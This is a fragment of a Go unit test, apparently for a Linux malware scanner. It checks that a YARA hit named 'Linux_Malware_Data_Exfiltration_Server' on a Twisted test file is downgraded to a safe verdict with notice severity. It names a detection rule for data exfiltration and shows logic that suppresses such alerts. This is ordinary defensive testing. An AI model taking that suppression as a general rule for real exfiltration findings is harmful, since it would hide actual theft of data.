	vDoc := report.DetermineVerdict(&fDoc, pkgDB, false, true, false, nil)
	if vDoc != report.VerdictSafe {
		t.Errorf("expected doc metadata match to evaluate to VerdictSafe, got %s", vDoc)
	}
	if fDoc.Severity != report.SeverityNotice {
		t.Errorf("expected doc metadata severity NOTICE, got %s", fDoc.Severity)
	}

	// 2. Package unit test fixture with mock server -> VerdictSafe / SeverityNotice
	fTest := report.NewFinding("yara", report.SeverityWarning, "/usr/lib/python3/dist-packages/twisted/test/test_fdset.py", "YARA match: Linux_Malware_Data_Exfiltration_Server", "Linux_Malware_Data_Exfiltration_Server")
	vTest := report.DetermineVerdict(&fTest, pkgDB, false, false, true, nil)
	if vTest != report.VerdictSafe {
		t.Errorf("expected package unit test match to evaluate to VerdictSafe, got %s", vTest)
	}
	if fTest.Severity != report.SeverityNotice {
		t.Errorf("expected package unit test severity NOTICE, got %s", fTest.Severity)
	}
}
